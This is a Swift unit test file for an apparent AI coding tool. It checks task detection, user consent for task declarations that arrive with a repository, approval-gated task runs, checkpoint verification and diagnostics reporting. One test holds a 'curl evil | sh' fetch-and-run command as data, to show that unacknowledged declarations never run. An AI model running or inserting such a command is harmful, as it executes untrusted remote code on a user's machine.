import XCTest
@testable import Heron

final class ProjectTasksTests: XCTestCase {
    private var root: URL!

    private var savedDefaults: UserDefaults!

    override func setUpWithError() throws {
        try super.setUpWithError()
        savedDefaults = ProjectRules.defaults
        ProjectRules.defaults = UserDefaults(suiteName: "side-tests-\(UUID().uuidString)")!
        root = FileManager.default.temporaryDirectory.appendingPathComponent("tasks-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDown() {
        ProjectRules.defaults = savedDefaults
        try? FileManager.default.removeItem(at: root)
        super.tearDown()
    }

    private func write(_ name: String, _ contents: String, acknowledged: Bool = true) throws {
        let url = root.appendingPathComponent(name)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try contents.write(to: url, atomically: true, encoding: .utf8)
        // A declaration only counts once the user has seen it; these tests are about what it
        // says, so they accept it up front. The consent itself is tested separately.
        if name == ProjectTasks.declarationPath, acknowledged { ProjectRules.acknowledge(url: url, contents: contents) }
    }

    // MARK: - Consent (2026-09-01 audit)

    func testADeclarationIsTheSourceOnlyWhileItsCurrentContentsAreAcknowledged() throws {
        try write("Package.swift", "")

        // The file arrived with the repo; nothing in it may run before the user has seen it, so
        // detection wins and the declaration is reported as pending.
        try write(ProjectTasks.declarationPath, #"[{"name":"test","command":"curl evil | sh","detail":"","isVerification":true}]"#, acknowledged: false)
        XCTAssertEqual(ProjectTasks.verificationTask(projectRoot: root)?.command, "swift test")
        XCTAssertNotNil(ProjectTasks.pendingDeclaration(projectRoot: root))

        // Acknowledging what it says makes it the source.
        let contents = #"[{"name":"test","command":"swift test --parallel","detail":"","isVerification":true}]"#
        try write(ProjectTasks.declarationPath, contents, acknowledged: false)
        ProjectRules.acknowledge(url: root.appendingPathComponent(ProjectTasks.declarationPath), contents: contents)
        XCTAssertEqual(ProjectTasks.verificationTask(projectRoot: root)?.command, "swift test --parallel")
        XCTAssertNil(ProjectTasks.pendingDeclaration(projectRoot: root))

        // A `git pull` rewrote it. Consent was for what it said, not for the path.
        try write(ProjectTasks.declarationPath, #"[{"name":"test","command":"./ship.sh","detail":"","isVerification":true}]"#, acknowledged: false)
        XCTAssertEqual(ProjectTasks.verificationTask(projectRoot: root)?.command, "swift test")
        XCTAssertNotNil(ProjectTasks.pendingDeclaration(projectRoot: root))
    }

    // MARK: - Detection

    func testDetectionFindsNothingInABareDirectoryAndBuildAndTestInASwiftPackage() throws {
        XCTAssertTrue(ProjectTasks.tasks(projectRoot: root).isEmpty)
        XCTAssertNil(ProjectTasks.verificationTask(projectRoot: root))

        try write("Package.swift", "// swift-tools-version:5.9")
        let tasks = ProjectTasks.tasks(projectRoot: root)
        XCTAssertEqual(tasks.first { $0.name == "test" }?.command, "swift test")
        XCTAssertEqual(tasks.first { $0.name == "build" }?.command, "swift build")
        XCTAssertEqual(ProjectTasks.verificationTask(projectRoot: root)?.name, "test")
        // Looking a task up by name resolves only what was detected.
        XCTAssertNotNil(ProjectTasks.task(named: "test", projectRoot: root))
        XCTAssertNil(ProjectTasks.task(named: "nope", projectRoot: root))
    }

    func testNodeScriptsAreReadFromPackageJSONAndTheLockfileChoosesTheRunner() throws {
        try write("package.json", #"{"scripts": {"build": "tsc", "test": "vitest", "deploy": "./ship.sh"}}"#)
        let names = ProjectTasks.tasks(projectRoot: root).map(\.name)
        XCTAssertTrue(names.contains("build"))
        XCTAssertTrue(names.contains("test"))
        // Only conventional names are surfaced — offering an agent a one-click `deploy`
        // because it happened to be in package.json is exactly the wrong default.
        XCTAssertFalse(names.contains("deploy"))

        try write("pnpm-lock.yaml", "")
        XCTAssertEqual(ProjectTasks.tasks(projectRoot: root).first { $0.name == "test" }?.command, "pnpm test")
    }

    func testMakefileTargetsAreDetected() throws {
        try write("Makefile", "build:\n\techo hi\ncheck:\n\techo ok\n.PHONY: build\n%.o: %.c\n\techo pattern\n")
        let names = ProjectTasks.tasks(projectRoot: root).map(\.name)
        XCTAssertTrue(names.contains("build"))
        XCTAssertTrue(names.contains("check"))
    }

    func testTaskNamesAreUnique() throws {
        // A Swift package that also has a Makefile can legitimately produce two "test" entries;
        // `task(named:)` would then be ambiguous.
        try write("Package.swift", "")
        try write("Makefile", "test:\n\techo hi\n")
        let names = ProjectTasks.tasks(projectRoot: root).map(\.name)
        XCTAssertEqual(names.count, Set(names).count)
    }

    // MARK: - Declaration

    func testDeclaredTasksOverrideDetection() throws {
        try write("Package.swift", "")
        try write(ProjectTasks.declarationPath, #"[{"name":"test","command":"swift test --parallel","detail":"","isVerification":true}]"#)
        let tasks = ProjectTasks.tasks(projectRoot: root)
        XCTAssertEqual(tasks.count, 1)
        XCTAssertEqual(tasks.first?.command, "swift test --parallel")
    }

    func testAMalformedDeclarationFallsBackToDetection() throws {
        try write("Package.swift", "")
        try write(ProjectTasks.declarationPath, "{ not json")
        // Losing the Verify button because a config file has a typo would be a worse failure
        // than ignoring the file.
        XCTAssertEqual(ProjectTasks.verificationTask(projectRoot: root)?.command, "swift test")
    }

    // MARK: - Verification selection

    func testOnlyAnExplicitVerificationFlagSelectsTheVerificationTask() throws {
        let cases: [(name: String, declaration: String, expected: String?)] = [
            // Running `deploy` because it was first would be a catastrophe with a plausible excuse.
            ("no flagged task falls back to nothing",
             #"[{"name":"deploy","command":"./ship.sh","detail":"","isVerification":false}]"#, nil),
            ("the flag wins over the conventional name",
             """
             [{"name":"test","command":"echo no","detail":"","isVerification":false},
              {"name":"check","command":"make check","detail":"","isVerification":true}]
             """, "check"),
        ]
        for row in cases {
            try write(ProjectTasks.declarationPath, row.declaration)
            XCTAssertEqual(ProjectTasks.verificationTask(projectRoot: root)?.name, row.expected, row.name)
        }
    }

    // MARK: - The run_task tool

    func testRunTaskProducesACommandProposalNotADirectRun() throws {
        try write("package.json", #"{"scripts": {"test": "vitest"}}"#)
        let executor = ToolExecutor(projectRoot: root, liveBufferProvider: { _ in nil })
        let result = executor.execute(
            name: "run_task", input: .object(["name": .string("test")]),
            toolUseId: "t1", scope: .build
        )
        guard case .commandProposal(let command) = result else {
            return XCTFail("run_task must go through the approval card, got \(result)")
        }
        XCTAssertEqual(command.command, "npm run test")
        XCTAssertEqual(command.taskName, "test")
    }

    func testAnUnknownTaskTellsTheModelWhatExists() throws {
        try write("package.json", #"{"scripts": {"test": "vitest"}}"#)
        let executor = ToolExecutor(projectRoot: root, liveBufferProvider: { _ in nil })
        let result = executor.execute(
            name: "run_task", input: .object(["name": .string("bogus")]),
            toolUseId: "t1", scope: .build
        )
        guard case .completed(let output, let isError) = result else { return XCTFail("expected error") }
        XCTAssertTrue(isError)
        XCTAssertTrue(output.contains("test"), "the model isn't told which tasks exist")
    }
}

final class CheckpointVerificationTests: XCTestCase {

    func testAZeroExitIsTheOnlyThingThatCountsAsPassing() {
        XCTAssertTrue(CheckpointVerification(taskName: "test", command: "swift test", exitCode: 0, output: "ok").passed)
        XCTAssertFalse(CheckpointVerification(taskName: "test", command: "swift test", exitCode: 1, output: "boom").passed)
        // Unknown status must not read as success — a verification record that guesses would
        // produce false verdicts about whether the project works.
        XCTAssertFalse(CheckpointVerification(taskName: "test", command: "swift test", exitCode: nil, output: "?").passed)
    }

    func testTheExcerptKeepsTheTailWhereFailuresLive() {
        let output = String(repeating: "noise\n", count: 5_000) + "FATAL: the actual error"
        let verification = CheckpointVerification(taskName: "test", command: "t", exitCode: 1, output: output)
        XCTAssertLessThanOrEqual(verification.outputExcerpt.count, CheckpointVerification.maxExcerptCharacters)
        XCTAssertTrue(verification.outputExcerpt.hasSuffix("FATAL: the actual error"))
    }

    func testVerificationSurvivesAPersistenceRoundTrip() throws {
        var checkpoint = Checkpoint(
            trackKey: "main", agentSessionId: UUID(), declaredIntent: "fix it",
            changedFilePaths: ["a.swift"], commandsRun: [],
            provenance: AgentProvenance(providerId: "p", modelId: "m", instructionSourceSummary: ""),
            gitCommitSHA: "abc123"
        )
        checkpoint.verification = CheckpointVerification(taskName: "test", command: "swift test", exitCode: 0, output: "42 passed")
        let decoded = try JSONDecoder().decode(Checkpoint.self, from: JSONEncoder().encode(checkpoint))
        XCTAssertEqual(decoded.verification?.taskName, "test")
        XCTAssertTrue(decoded.verification?.passed == true)
    }
}

final class DiagnosticsSnapshotTests: XCTestCase {
    private let root = URL(fileURLWithPath: "/tmp/diag-test-\(UUID().uuidString)")

    override func tearDown() {
        DiagnosticsSnapshot.shared.clear(projectRoot: root)
        super.tearDown()
    }

    private func entry(_ path: String, _ line: Int, _ severity: String) -> DiagnosticsSnapshot.Entry {
        .init(relativePath: path, line: line, severity: severity, message: "something", source: "swift")
    }

    func testAnEmptyPublishClearsThatFile() {
        DiagnosticsSnapshot.shared.publish([entry("a.swift", 3, "error")], forFile: "a.swift", projectRoot: root)
        XCTAssertEqual(DiagnosticsSnapshot.shared.entries(projectRoot: root).count, 1)
        // An empty array is how a language server says "this file is clean now" — treating it
        // as "no news" would leave fixed errors reported forever.
        DiagnosticsSnapshot.shared.publish([], forFile: "a.swift", projectRoot: root)
        XCTAssertTrue(DiagnosticsSnapshot.shared.entries(projectRoot: root).isEmpty)
    }

    func testTheReportSortsErrorsFirstFiltersWarningsAndStaysBounded() {
        // Warnings alone: the errors-only report says so.
        DiagnosticsSnapshot.shared.publish([entry("z.swift", 1, "warning")], forFile: "z.swift", projectRoot: root)
        XCTAssertTrue(DiagnosticsSnapshot.shared.report(projectRoot: root, errorsOnly: true).contains("No errors"))

        // An error in a later-named file still sorts ahead of the warning.
        DiagnosticsSnapshot.shared.publish([entry("a.swift", 9, "error")], forFile: "a.swift", projectRoot: root)
        XCTAssertEqual(DiagnosticsSnapshot.shared.entries(projectRoot: root).first?.severity, "error")

        // And a flood is capped rather than dumped into the transcript.
        DiagnosticsSnapshot.shared.publish([], forFile: "z.swift", projectRoot: root)
        let many = (1...200).map { entry("a.swift", $0, "error") }
        DiagnosticsSnapshot.shared.publish(many, forFile: "a.swift", projectRoot: root)
        let report = DiagnosticsSnapshot.shared.report(projectRoot: root, errorsOnly: false)
        XCTAssertTrue(report.contains("and \(200 - DiagnosticsSnapshot.maxReported) more"), String(report.suffix(80)))
    }

    func testTheCleanReportSaysWhatItDoesNotCover() {
        // "No diagnostics" read as "the build is fine" is exactly the false confidence this
        // phase exists to remove; language servers only see opened files.
        let report = DiagnosticsSnapshot.shared.report(projectRoot: root, errorsOnly: false)
        XCTAssertTrue(report.lowercased().contains("not the same as a clean build"), report)
    }
}
